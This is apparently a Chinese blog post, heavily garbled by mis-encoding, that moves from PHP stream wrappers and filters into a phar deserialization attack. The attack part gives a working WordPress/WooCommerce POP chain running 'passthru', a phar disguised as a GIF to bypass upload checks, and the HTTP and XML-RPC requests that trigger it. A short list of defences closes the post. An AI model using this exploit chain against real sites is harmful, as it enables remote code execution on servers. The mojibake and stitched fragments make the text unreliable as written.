<p>åœ¨ç”¨fopenã€fwriteã€freadã€fgetsã€feofã€rewindã€file_put_contentsã€file_get_contentsç­‰ç­‰æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ“ä½œæµæ—¶ï¼Œæ•°æ®æ˜¯å…ˆä¼ ç»™å®šä¹‰çš„åŒ…è£…å™¨ç±»å¯¹è±¡ï¼ŒåŒ…è£…å™¨å†å»æ“ä½œæµã€‚</p>

<p>å¦‚ä½•å®ç°ä¸€ä¸ªè‡ªå®šä¹‰çš„æµåŒ…è£…å™¨å‘¢ï¼Ÿphpæä¾›äº†ä¸€ä¸ªç±»åŸå‹ï¼Œåªæ˜¯åŸå‹è€Œå·²ï¼Œä¸æ˜¯æ¥å£ä¹Ÿä¸æ˜¯ç±»ï¼Œä¸èƒ½ç”¨äºç»§æ‰¿ï¼š</p>

<p>streamWrapper {
/* å±æ€§ <em>/
public resource $context ;
/</em> æ–¹æ³• */
__construct ( void )
__destruct ( void )
public bool dir_closedir ( void )
public bool dir_opendir ( string $path , int $options )
public string dir_readdir ( void )
public bool dir_rewinddir ( void )
public bool mkdir ( string $path , int $mode , int $options )
public bool rename ( string $path_from , string $path_to )
public bool rmdir ( string $path , int $options )
public resource stream_cast ( int $cast_as )
public void stream_close ( void )
public bool stream_eof ( void )
public bool stream_flush ( void )
public bool stream_lock ( int $operation )
public bool stream_metadata ( string $path , int $option , mixed $value )
public bool stream_open ( string $path , string $mode , int $options , string &amp;$opened_path )
public string stream_read ( int $count )
public bool stream_seek ( int $offset , int $whence = SEEK_SET )
public bool stream_set_option ( int $option , int $arg1 , int $arg2 )
public array stream_stat ( void )
public int stream_tell ( void )
public bool stream_truncate ( int $new_size )
public int stream_write ( string $data )
public bool unlink ( string $path )
public array url_stat ( string $path , int $flags )
}</p>

<p>åœ¨è¿™ä¸ªåŸå‹é‡Œé¢å®šä¹‰çš„æ–¹æ³•ï¼Œæ ¹æ®è‡ªå·±éœ€è¦å»å®šä¹‰ï¼Œå¹¶ä¸è¦æ±‚å…¨éƒ¨å®ç°ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸å®šä¹‰æˆæ¥å£çš„åŸå› ï¼Œå› ä¸ºæœ‰äº›å®ç°æ ¹æœ¬ç”¨ä¸ç€æŸäº›æ–¹æ³•ï¼Œ
è¿™å¸¦æ¥å¾ˆå¤šçµæ´»æ€§ï¼Œæ¯”å¦‚åŒ…è£…å™¨æ˜¯ä¸æ”¯æŒåˆ é™¤ç›®å½•rmdiråŠŸèƒ½çš„ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦å®ç°streamWrapper::rmdir
ç”±äºæœªå®ç°å®ƒï¼Œå¦‚æœç”¨æˆ·åœ¨åŒ…è£…å™¨ä¸Šè°ƒç”¨rmdirå°†æœ‰é”™è¯¯æŠ›å‡ºï¼Œè¦è‡ªå®šä¹‰è¿™ä¸ªé”™è¯¯é‚£ä¹ˆä¹Ÿå¯ä»¥å®ç°å®ƒå¹¶åœ¨å…¶å†…éƒ¨æŠ›å‡ºé”™è¯¯</p>

<p>streamWrapperä¹Ÿä¸æ˜¯ä¸€ä¸ªé¢„å®šä¹‰ç±»ï¼Œæµ‹è¯•class_exists(â€œstreamWrapperâ€)å°±çŸ¥é“ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæŒ‡å¯¼å¼€å‘è€…çš„åŸå‹</p>

<p>å®˜æ–¹æ‰‹å†Œæä¾›äº†ä¸€ä¸ªä¾‹å­ï¼šhttp://php.net/manual/zh/stream.streamwrapper.example-1.php</p>

<p>æœ¬åšå®¢æä¾›ä¸€ä¸ªä»drupal8ç³»ç»Ÿä¸­æŠ½å–ä¿®æ”¹è¿‡çš„åŒ…è£…å™¨ä¾‹å­ï¼Œè¯·çœ‹drupal8æºç åˆ†æå…³äºæµé‚£ä¸€éƒ¨åˆ†</p>

<p>æµç³»åˆ—å‡½æ•°ï¼Œå®˜æ–¹æ‰‹å†Œï¼šhttp://php.net/manual/zh/ref.stream.php
å¸¸ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š
stream_bucket_appendå‡½æ•°ï¼šä¸ºé˜Ÿåˆ—æ·»åŠ æ•°æ®ã€€
stream_bucket_make_writeableå‡½æ•°ï¼šä»æ“ä½œçš„é˜Ÿåˆ—ä¸­è¿”å›ä¸€ä¸ªæ•°æ®å¯¹è±¡
stream_bucket_newå‡½æ•°ï¼šä¸ºå½“å‰é˜Ÿåˆ—åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®
stream_bucket_prependå‡½æ•°ï¼šé¢„å¤‡æ•°æ®åˆ°é˜Ÿåˆ—ã€€
stream_context_createå‡½æ•°ï¼šåˆ›å»ºæ•°æ®æµä¸Šä¸‹æ–‡
stream_context_get_defaultå‡½æ•°ï¼šè·å–é»˜è®¤çš„æ•°æ®æµä¸Šä¸‹æ–‡
stream_context_get_optionså‡½æ•°ï¼šè·å–æ•°æ®æµçš„è®¾ç½®
stream_context_set_optionå‡½æ•°ï¼šå¯¹æ•°æ®æµã€æ•°æ®åŒ…æˆ–è€…ä¸Šä¸‹æ–‡è¿›è¡Œè®¾ç½®
stream_context_set_paramså‡½æ•°ï¼šä¸ºæ•°æ®æµã€æ•°æ®åŒ…æˆ–è€…ä¸Šä¸‹æ–‡è®¾ç½®å‚æ•°
stream_copy_to_streamå‡½æ•°ï¼šåœ¨æ•°æ®æµä¹‹é—´è¿›è¡Œå¤åˆ¶æ“ä½œ
stream_filter_appendå‡½æ•°ï¼šä¸ºæ•°æ®æµæ·»åŠ è¿‡æ»¤å™¨
stream_filter_prependå‡½æ•°ï¼šä¸ºæ•°æ®æµé¢„å¤‡æ·»åŠ è¿‡æ»¤å™¨
stream_filter_registerå‡½æ•°ï¼šæ³¨å†Œä¸€ä¸ªæ•°æ®æµçš„è¿‡æ»¤å™¨å¹¶ä½œä¸ºPHPç±»æ‰§è¡Œ
stream_filter_removeå‡½æ•°ï¼šä»ä¸€ä¸ªæ•°æ®æµä¸­ç§»é™¤è¿‡æ»¤å™¨
stream_get_contentså‡½æ•°ï¼šè¯»å–æ•°æ®æµä¸­çš„å‰©ä½™æ•°æ®åˆ°å­—ç¬¦ä¸²
stream_get_filterså‡½æ•°ï¼šè¿”å›å·²ç»æ³¨å†Œçš„æ•°æ®æµè¿‡æ»¤å™¨åˆ—è¡¨
stream_get_lineå‡½æ•°ï¼šæŒ‰ç…§ç»™å®šçš„å®šç•Œç¬¦ä»æ•°æ®æµèµ„æºä¸­è·å–è¡Œ
stream_get_meta_dataå‡½æ•°ï¼šä»å°è£…åè®®æ–‡ä»¶æŒ‡é’ˆä¸­è·å–æŠ¥å¤´/å…ƒæ•°æ®
stream_get_transportså‡½æ•°ï¼šè¿”å›æ³¨å†Œçš„Socketä¼ è¾“åˆ—è¡¨
stream_get_wrapperså‡½æ•°ï¼šè¿”å›æ³¨å†Œçš„æ•°æ®æµåˆ—è¡¨
stream_register_wrapperå‡½æ•°ï¼šæ³¨å†Œä¸€ä¸ªç”¨PHPç±»å®ç°çš„URLå°è£…åè®®
stream_selectå‡½æ•°ï¼šæ¥æ”¶æ•°æ®æµæ•°ç»„å¹¶ç­‰å¾…å®ƒä»¬çŠ¶æ€çš„æ”¹å˜
stream_set_blockingå‡½æ•°ï¼šå°†ä¸€ä¸ªæ•°æ®æµè®¾ç½®ä¸ºå µå¡æˆ–è€…éå µå¡çŠ¶æ€
stream_set_timeoutå‡½æ•°ï¼šå¯¹æ•°æ®æµè¿›è¡Œè¶…æ—¶è®¾ç½®
stream_set_write_bufferå‡½æ•°ï¼šä¸ºæ•°æ®æµè®¾ç½®ç¼“å†²åŒº
stream_socket_acceptå‡½æ•°ï¼šæ¥å—ç”±å‡½æ•°stream_ socket_server()åˆ›å»ºçš„Socketè¿æ¥
stream_socket_clientå‡½æ•°ï¼šæ‰“å¼€ç½‘ç»œæˆ–è€…UNIXä¸»æœºçš„Socketè¿æ¥
stream_socket_enable_cryptoå‡½æ•°ï¼šä¸ºä¸€ä¸ªå·²ç»è¿æ¥çš„Socketæ‰“å¼€æˆ–è€…å…³é—­æ•°æ®åŠ å¯†
stream_socket_get_nameå‡½æ•°ï¼šè·å–æœ¬åœ°æˆ–è€…ç½‘ç»œSocketçš„åç§°
stream_socket_pairå‡½æ•°ï¼šåˆ›å»ºä¸¤ä¸ªæ— åŒºåˆ«çš„Socketæ•°æ®æµè¿æ¥
stream_socket_recvfromå‡½æ•°ï¼šä»Socketè·å–æ•°æ®ï¼Œä¸ç®¡å…¶è¿æ¥ä¸å¦
stream_socket_sendtoå‡½æ•°ï¼šå‘Socketå‘é€æ•°æ®ï¼Œä¸ç®¡å…¶è¿æ¥ä¸å¦
stream_socket_serverå‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªç½‘ç»œæˆ–è€…UNIX SocketæœåŠ¡ç«¯
stream_wrapper_restoreå‡½æ•°ï¼šæ¢å¤ä¸€ä¸ªäº‹å…ˆæ³¨é”€çš„æ•°æ®åŒ…
stream_wrapper_unregisterå‡½æ•°ï¼šæ³¨é”€ä¸€ä¸ªURLåœ°å€åŒ…</p>

<p>ä¸€ä¸ªè¿‡æ»¤å™¨çš„åˆ—å­åŠè§£é‡Šï¼š</p>

<p>ç›¸å…³é“¾æ¥ï¼š</p>

<p>ç”¨æˆ·è¿‡æ»¤å™¨åŸºç±»ï¼šhttp://php.net/manual/zh/class.php-user-filter.php</p>

<p>è¿‡æ»¤å™¨æ³¨å†Œï¼šhttp://php.net/manual/zh/function.stream-filter-register.php</p>

<p>&lt;?php</p>

<p>/* å®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ */
class strtoupper_filter extends php_user_filter {
  function filter($in, $out, &amp;$consumed, $closing)
  {
    while ($bucket = stream_bucket_make_writeable($in)) { //ä»æµé‡Œé¢å–å‡ºä¸€æ®µæ•°æ®
      $bucket-&gt;data = strtoupper($bucket-&gt;data);
      $consumed += $bucket-&gt;datalen;
      stream_bucket_append($out, $bucket); //å°†ä¿®æ”¹åçš„æ•°æ®é€åˆ°è¾“å‡ºçš„åœ°æ–¹
    }
    return PSFS_PASS_ON;
  }
}</p>

<p>/* æ³¨å†Œè¿‡æ»¤å™¨åˆ°php */
stream_filter_register(â€œstrtoupperâ€, â€œstrtoupper_filterâ€)
    or die(â€œFailed to register filterâ€);</p>

<p>$fp = fopen(â€œfoo-bar.txtâ€, â€œwâ€);</p>

<p>/* åº”ç”¨è¿‡æ»¤å™¨åˆ°ä¸€ä¸ªæµ */
stream_filter_append($fp, â€œstrtoupperâ€);</p>

<p>fwrite($fp, â€œLine1\nâ€);
fwrite($fp, â€œWord - 2\nâ€);
fwrite($fp, â€œEasy As 123\nâ€);</p>

<p>fclose($fp);</p>

<p>//è¯»å–å¹¶æ˜¾ç¤ºå†…å®¹ å°†å…¨éƒ¨å˜ä¸ºå¤§å†™
readfile(â€œfoo-bar.txtâ€);</p>

<p>https://blog.csdn.net/u011474028/article/details/52814049</p>

<p>http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/</p>

<p>phar_test2.php</p>

<p>&lt;?php 
    class TestObject {
        public function __destruct() {
            echo â€˜Destruct calledâ€™;
        }
    }</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = 'phar://phar.phar/a_random_string';
file_exists($filename);
//......  ?&gt; å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä¸€äº›ä¹‹å‰çœ‹èµ·æ¥â€œäººç•œæ— å®³â€çš„å‡½æ•°ä¹Ÿå˜å¾—â€œæš—è—æ€æœºâ€ï¼Œæå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ã€‚
</code></pre></div></div>

<p>2.3 å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶
åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>

<p>&lt;?php
    class TestObject {
    }</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´
$o = new TestObject();
$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
$phar-&gt;addFromString("test.txt", "test"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
//ç­¾åè‡ªåŠ¨è®¡ç®—
$phar-&gt;stopBuffering(); ?&gt;
</code></pre></div></div>

<p>é‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚</p>

<p>0x03 å®é™…åˆ©ç”¨
3.1 åˆ©ç”¨æ¡ä»¶
ä»»ä½•æ¼æ´æˆ–æ”»å‡»æ‰‹æ³•ä¸èƒ½å®é™…åˆ©ç”¨ï¼Œéƒ½æ˜¯çº¸ä¸Šè°ˆå…µã€‚åœ¨åˆ©ç”¨ä¹‹å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿™ç§æ”»å‡»çš„åˆ©ç”¨æ¡ä»¶ã€‚</p>

<p>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚
è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚
æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚
3.2 wordpress
wordpressæ˜¯ç½‘ç»œä¸Šæœ€å¹¿æ³›ä½¿ç”¨çš„cmsï¼Œè¿™ä¸ªæ¼æ´åœ¨2017å¹´2æœˆä»½å°±æŠ¥å‘Šç»™äº†å®˜æ–¹ï¼Œä½†è‡³ä»Šä»æœªä¿®è¡¥ã€‚ä¹‹å‰çš„ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ä¹Ÿæ˜¯å‡ºç°åœ¨è¿™éƒ¨åˆ†ä»£ç ä¸­ï¼ŒåŒæ ·æ²¡æœ‰ä¿®è¡¥ã€‚æ ¹æ®åˆ©ç”¨æ¡ä»¶ï¼Œæˆ‘ä»¬å…ˆè¦æ„é€ pharæ–‡ä»¶ã€‚</p>

<p>é¦–å…ˆå¯»æ‰¾èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„ç±»æ–¹æ³•ï¼š</p>

<p>wp-includes/Requests/Utility/FilteredIterator.php</p>

<p>class Requests_Utility_FilteredIterator extends ArrayIterator {
    /**
    * Callback to run as a filter
    *
    * @var callable
    */
    protected $callback;
    â€¦
    public function current() {
        $value = parent::current();
        $value = call_user_func($this-&gt;callback, $value);
        return $value;
    }
}
è¿™ä¸ªç±»ç»§æ‰¿äº†ArrayIteratorï¼Œæ¯å½“è¿™ä¸ªç±»å®ä¾‹åŒ–çš„å¯¹è±¡è¿›å…¥foreachè¢«éå†çš„æ—¶å€™ï¼Œcurrent()æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚ä¸‹ä¸€æ­¥è¦å¯»æ‰¾ä¸€ä¸ªå†…éƒ¨ä½¿ç”¨foreachçš„ææ„æ–¹æ³•ï¼Œå¾ˆé—æ†¾wordpressçš„æ ¸å¿ƒä»£ç ä¸­å¹¶æ²¡æœ‰åˆé€‚çš„ç±»ï¼Œåªèƒ½ä»æ’ä»¶å…¥æ‰‹ã€‚è¿™é‡Œåœ¨WooCommerceæ’ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿåˆ©ç”¨çš„ç±»ï¼š</p>

<p>wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.php</p>

<p>class WC_Log_Handler_File extends WC_Log_Handler {
    protected $handles = array();
    /<em>â€¦â€¦</em>/
    public function __destruct() {
        foreach ( $this-&gt;handles as $handle ) {
            if ( is_resource( $handle ) ) {
                fclose( $handle ); // @codingStandardsIgnoreLine.
            }
        }
    }
    /<em>â€¦â€¦</em>/
}
åˆ°è¿™é‡Œpopé“¾å°±æ„é€ å®Œæˆäº†ï¼Œæ®æ­¤æ„å»ºpharæ–‡ä»¶ï¼š</p>

<p>&lt;?php
    class Requests_Utility_FilteredIterator extends ArrayIterator {
        protected $callback;
        public function __construct($data, $callback) {
            parent::__construct($data);
            $this-&gt;callback = $callback;
        }
    }</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class WC_Log_Handler_File {
    protected $handles;
    public function __construct() {
        $this-&gt;handles = new Requests_Utility_FilteredIterator(array('id'), 'passthru');
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //è®¾ç½®stub, å¢åŠ gifæ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹
$o = new WC_Log_Handler_File();
$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
$phar-&gt;addFromString("test.txt", "test"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
//ç­¾åè‡ªåŠ¨è®¡ç®—
$phar-&gt;stopBuffering(); ?&gt; å°†åç¼€åæ”¹ä¸ºgifåï¼Œå¯ä»¥åœ¨åå°ä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥é€šè¿‡xmlrpcæ¥å£ä¸Šä¼ ï¼Œéƒ½éœ€è¦authoråŠä»¥ä¸Šçš„æƒé™ã€‚è®°ä¸‹ä¸Šä¼ åçš„æ–‡ä»¶åå’Œpost_IDã€‚
</code></pre></div></div>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªå‚æ•°å¯æ§çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼š</p>

<p>wp-includes/post.php</p>

<p>function wp_get_attachment_thumb_file( $post_id = 0 ) {
    $post_id = (int) $post_id;
    if ( !$post = get_post( $post_id ) )
        return false;
    if ( !is_array( $imagedata = wp_get_attachment_metadata( $post-&gt;ID ) ) )
        return false;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$file = get_attached_file( $post-&gt;ID );

if ( !empty($imagedata['thumb']) &amp;&amp; ($thumbfile = str_replace(basename($file), $imagedata['thumb'], $file)) &amp;&amp; file_exists($thumbfile) ) {
    /**
     * Filters the attachment thumbnail file path.
     *
     * @since 2.1.0
     *
     * @param string $thumbfile File path to the attachment thumbnail.
     * @param int    $post_id   Attachment ID.
     */
    return apply_filters( 'wp_get_attachment_thumb_file', $thumbfile, $post-&gt;ID );
}
return false; } è¯¥å‡½æ•°å¯ä»¥é€šè¿‡XMLRPCè°ƒç”¨"wp.getMediaItem"è¿™ä¸ªæ–¹æ³•æ¥è®¿é—®åˆ°ï¼Œå˜é‡$thumbfileä¼ å…¥äº†file_exists()ï¼Œæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å›æº¯ä¸€ä¸‹$thumbfileå˜é‡ï¼Œçœ‹å…¶æ˜¯å¦å¯æ§ã€‚
</code></pre></div></div>

<p>æ ¹æ®$thumbfile = str_replace(basename($file), $imagedata[â€˜thumbâ€™], $file)ï¼Œå¦‚æœbasename($file)ä¸$fileç›¸åŒçš„è¯ï¼Œé‚£ä¹ˆ$thumbfileçš„å€¼å°±æ˜¯$imagedata[â€˜thumbâ€™]çš„å€¼ã€‚å…ˆæ¥çœ‹$fileæ˜¯å¦‚ä½•è·å–åˆ°çš„ï¼š</p>

<p>wp-includes/post.php</p>

<p>function get_attached_file( $attachment_id, $unfiltered = false ) {
    $file = get_post_meta( $attachment_id, â€˜_wp_attached_fileâ€™, true );</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// If the file is relative, prepend upload dir.
if ( $file &amp;&amp; 0 !== strpos( $file, '/' ) &amp;&amp; ! preg_match( '|^.:\\\|', $file ) &amp;&amp; ( ( $uploads = wp_get_upload_dir() ) &amp;&amp; false === $uploads['error'] ) ) {
    $file = $uploads['basedir'] . "/$file";
}

if ( $unfiltered ) {
    return $file;
}

/**
 * Filters the attached file based on the given ID.
 *
 * @since 2.1.0
 *
 * @param string $file          Path to attached file.
 * @param int    $attachment_id Attachment ID.
 */
return apply_filters( 'get_attached_file', $file, $attachment_id ); } å¦‚æœ$fileæ˜¯ç±»ä¼¼äºwindowsç›˜ç¬¦çš„è·¯å¾„Z:\Zï¼Œæ­£åˆ™åŒ¹é…å°±ä¼šå¤±è´¥ï¼Œ$fileå°±ä¸ä¼šæ‹¼æ¥å…¶ä»–ä¸œè¥¿ï¼Œæ­¤æ—¶å°±å¯ä»¥ä¿è¯basename($file)ä¸$fileç›¸åŒã€‚
</code></pre></div></div>

<p>å¯ä»¥é€šè¿‡å‘é€å¦‚ä¸‹æ•°æ®åŒ…æ¥è°ƒç”¨è®¾ç½®$fileçš„å€¼ï¼š</p>

<p>POST /wordpress/wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 147
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8
Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&amp;action=edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
Connection: close</p>

<p>_wpnonce=1da6c638f9&amp;_wp_http_referer=%2Fwp-
admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&amp;action=editpost&amp;post_type=attachment&amp;post_ID=11&amp;file=Z:\Z
åŒæ ·å¯ä»¥é€šè¿‡å‘é€å¦‚ä¸‹æ•°æ®åŒ…æ¥è®¾ç½®$imagedata[â€˜thumbâ€™]çš„å€¼ï¼š</p>

<p>POST /wordpress/wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 184
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8
Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&amp;action=edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORM
Connection: close</p>

<p>_wpnonce=1da6c638f9&amp;_wp_http_referer=%2Fwp-
admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&amp;action=editattachment&amp;post_ID=11&amp;thumb=phar://./wp-content/uploads/2018/08/phar-1.gif/blah.txt
_wpnonceå¯åœ¨ä¿®æ”¹é¡µé¢ä¸­è·å–ã€‚</p>

<p>æœ€åé€šè¿‡XMLRPCè°ƒç”¨â€wp.getMediaItemâ€è¿™ä¸ªæ–¹æ³•æ¥è°ƒç”¨wp_get_attachment_thumb_file()å‡½æ•°æ¥è§¦å‘ååºåˆ—åŒ–ã€‚xmlè°ƒç”¨æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>

<p>POST /wordpress/xmlrpc.php HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml
Cookie: XDEBUG_SESSION=PHPSTORM
Content-Length: 529
Connection: close</p>

<p>&lt;?xml version=â€1.0â€ encoding=â€utf-8â€?&gt;</p>

<methodCall> 
  <methodName>wp.getMediaItem</methodName>  
  <params> 
    <param /> 
      <value> 
        <string>1</string> 
      </value> 
    &lt;/param&gt;  
    <param /> 
      <value> 
        <string>author</string> 
      </value> 
    &lt;/param&gt;  
    <param /> 
      <value> 
        <string>you_password</string>
      </value> 
    &lt;/param&gt;  
    <param /> 
      <value> 
        <int>11</int> 
      </value> 
    &lt;/param&gt; 
  </params> 
</methodCall>

<p>0x04 é˜²å¾¡
åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚
ä¸¥æ ¼æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æ–‡ä»¶å¤´ã€‚
åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ä»£ç çš„å±é™©å‡½æ•°ã€‚</p>

<p>https://paper.seebug.org/680/</p>
:ET